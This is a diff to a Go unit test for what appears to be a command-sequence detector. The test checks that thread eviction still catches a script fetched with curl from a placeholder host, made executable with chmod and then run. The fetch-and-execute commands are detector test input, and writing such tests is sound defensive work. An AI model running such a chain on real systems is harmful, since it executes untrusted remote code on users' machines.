@@ -178,7 +178,11 @@ func TestNFAThreadBoundWithCaptures(t *testing.T) {
 	if n := ss.nfa.pending(); n > len(h.s.nfa.pats)*h.s.cfg.Sequence.Threads {
 		t.Fatalf("pending threads %d exceed bound", n)
 	}
-	// The newest downloads are still tracked.
+	// Eviction drops the oldest partial matches; the newest are tracked.
+	h.exec("curl -o f.sh https://e.io/a")
+	for i := 0; i < 10; i++ {
+		h.exec("curl -o g" + strings.Repeat("y", i) + ".sh https://e.io/a")
+	}
 	h.exec("chmod +x f.sh")
 	h.exec("./f.sh")
 	h.wantIncidents(DetectorSequence, 1)
